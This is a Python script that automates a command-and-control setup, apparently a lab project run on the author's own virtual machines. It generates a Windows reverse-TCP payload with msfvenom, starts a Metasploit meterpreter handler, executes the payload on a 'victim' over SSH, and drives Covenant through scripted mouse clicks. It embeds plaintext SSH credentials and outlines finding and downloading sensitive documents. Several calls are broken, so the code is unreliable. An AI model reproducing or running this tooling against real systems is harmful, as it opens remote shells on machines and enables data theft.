import paramiko
import pyautogui
import time

class C2Configuration:
    def __init__(self, C2_malware_name):
        self.C2_malware_name = C2_malware_name  # Meterpreter|Empire|Covenant|...

        self.map_abstraction_cmd_to_actual_Cmd = {
            "Meterpreter": {
                "ls": "ls",
                "ps": "ps",
                "pwd": "pwd",
                "kill": "kill",
                "ps": "ps",
            },
            "AnotherC2Malware": {
                "ls": "list",
                "ps": "processlist",
            }
        }


class C2Client:
    def __init__(self, config: C2Configuration):
        self.config = config
        self.attacker_ssh_client = paramiko.SSHClient()
        self.victim_ssh_client = paramiko.SSHClient()
        self.attacker_ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.current_directory = ''
        self.victim_ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def connect_ssh(self, host, username, password, client_type):
        if client_type == 'attacker':
            self.attacker_ssh_client.connect(host, username=username, password=password)
        elif client_type == 'victim':
            self.victim_ssh_client.connect(host, username=username, password=password)
        else:
            raise ValueError("Invalid client type. Choose 'attacker' or 'victim'.")

    def disconnect_ssh(self, client_type):
        if client_type == 'attacker':
            self.attacker_ssh_client.close()
        elif client_type == 'victim':
            self.victim_ssh_client.close()
        else:
            raise ValueError("Invalid client type. Choose 'attacker' or 'victim'.")

    def deploy_meterpreter(self):
        # create the payload   Note:Assuming there is an existing folder called ShellCodes
        output, error = self.execute_command('msfvenom -p windows/shell/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f exe > ~/Desktop/ShellCodes/payload.exe', 'attacker')
        print(output)

        # Currently we have to deploy the payload ourselves. I am doing it by setting up a webserver that has the payload.
        # How to do this: go to 'ShellCodes' and type in command 'python3 -m http.server'

        # Now we have to set up a reverse tcp listener using metasploit
        target_ip = '192.168.239.128'  # set host_ip here
        target_port = '5555'  # set listening port here

        msf_commands = f'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {target_ip}; set lport {target_port}; exploit;'
        command_to_run = f'msfconsole -q -x "{msf_commands}"'

        #Before you run the entire sequence of commands to start msfconsole, we need to make sure that the payload is already running on the victim machine.
        #One way to do this is using SCP or we would have to manually activate it.
        self.run_file()

        output, error = self.execute_command(command_to_run)

        print(output)
        return output, error


    def run_file(self):
        #connect to victim machine
        self.connect_ssh('127.0.0.1', 'hungvu203', 'Teemo12345!', 'victim') #These details are from my own virtual machines. You must change it to yours.

        #remote_file_path = '/path/on/victim/machine/file'  # Remote path of the file to be executed
        remote_file_path = '~/Downloads/payload.exe'
        remote_execution_command = f'bash {remote_file_path}'  # Command to execute the file
        output, error = self.execute_command(remote_execution_command, 'victim')
        print(f"Output: {output}")
        return output,error


    def execute_command(self, command, client_type):
        if client_type == 'attacker':
            if self.current_directory:
                command = f"cd {self.current_directory} && {command}"
            _, stdout, stderr = self.attacker_ssh_client.exec_command(command)
            output = stdout.read().decode('utf-8')
            error = stderr.read().decode('utf-8')
            return output, error
        elif client_type == 'victim':
            ssh_client = self.victim_ssh_client
        else:
            raise ValueError("Invalid client type. Choose 'attacker' or 'victim'.")

        if self.current_directory:
            command = f"cd {self.current_directory} && {command}"
        _, stdout, stderr = self.ssh_client.exec_command(command)
        output = stdout.read().decode('utf-8')
        error = stderr.read().decode('utf-8')
        return output, error

    def setup(self):
        # Assuming the Kali machine's details for demonstration:
        # Note: Must change based on which attacking machine you are using
        self.connect_ssh('192.168.239.128', 'kali', 'kali', 'attacker')

        if self.config.C2_malware_name == "Meterpreter":
            # Start metasploit handler at the attacker machine
            output, error = self.deploy_meterpreter()
            return

        elif self.config.C2_malware_name == "Covenant":
            #These coordinates are specifically for when I was testing

            #Move to listener tab
            pyautogui.moveTo(183, 241, duration=1)  # Move the mouse to XY coordinates over 1 second
            pyautogui.click()

            #then create the listener
            pyautogui.moveTo(368, 451, duration=1)  # Move the mouse to XY coordinates over 1 second
            pyautogui.click()

            #then go to the launcher tab
            pyautogui.moveTo(178, 279, duration=1)  # Move the mouse to XY coordinates over 1 second
            pyautogui.click()

            # then go to the grunts tab
            pyautogui.moveTo(188, 307, duration=1)  # Move the mouse to XY coordinates over 1 second
            pyautogui.click()

            return


    def ls(self):
        map = self.config.map_abstraction_cmd_to_actual_Cmd[self.config.C2_malware_name]
        actual_cmd_to_send = map["ls"]
        output, error = self.execute_command(actual_cmd_to_send, 'attacker')
        print(output)

    def pwd(self):
        map = self.config.map_abstraction_cmd_to_actual_Cmd[self.config.C2_malware_name]
        actual_cmd_to_send = map["pwd"]
        output, error = self.execute_command(actual_cmd_to_send, 'attacker')
        print(output)

    def cd(self, directory):
        output, error = self.execute_command(f'cd {directory} && pwd', 'attacker')
        self.current_directory = directory
        if error:
            print(f"Error changing directory: {error}")
        else:
            self.current_directory = output.strip()  # Update the current directory
            print(f"Changed to directory: {output.strip()}")

    def find(self, file_name):
        """

        :return:
        """

    def download_file(self, param):
        pass

    def ps(self):
        map = self.config.map_abstraction_cmd_to_actual_Cmd[self.config.C2_malware_name]
        actual_cmd_to_send = map["ps"]
        output, error = self.execute_command(actual_cmd_to_send, 'attacker')
        print(output)

    def killps(self):
        pass


if __name__ == "__main__":
    # List of C2 malware names
    # C2_malware_names = ['Meterpreter', "Empire", "Covenant"]
    C2_malware_names = ['Meterpreter']
    for C2_malware_name in C2_malware_names:
        # Create a configuration for the current malware name
        config = C2Configuration(C2_malware_name=C2_malware_name)

        # Initialize a C2Client with the configuration
        c2client = C2Client(config)

        # Set up the client (e.g., SSH into the Kali machine, run Metasploit, etc.)
        c2client.setup()

        # Testing
        c2client.pwd()
        c2client.ls()
        c2client.cd('Desktop')
        c2client.cd('ShellCodes')
        c2client.pwd()
        c2client.cd('')
        c2client.pwd()
        c2client.ls()

        # Attack script starts here (this is just a demo sequence)
        # c2client.ls()  # List files in the current directory
        # c2client.cd()  # Change directory (this is a placeholder and needs actual implementation)
        # c2client.ls()  # List files again
        # c2client.find("sensitive_document.doc")  # Search for a specific file
        # c2client.download_file("sensitive_document.doc")  # Download the file
        # c2client.ps()  # List running processes
        # c2client.killps()  # Kill a process (placeholder, needs actual implementation)

        # Remember to close the SSH connection after finishing with the current client
        c2client.disconnect_ssh()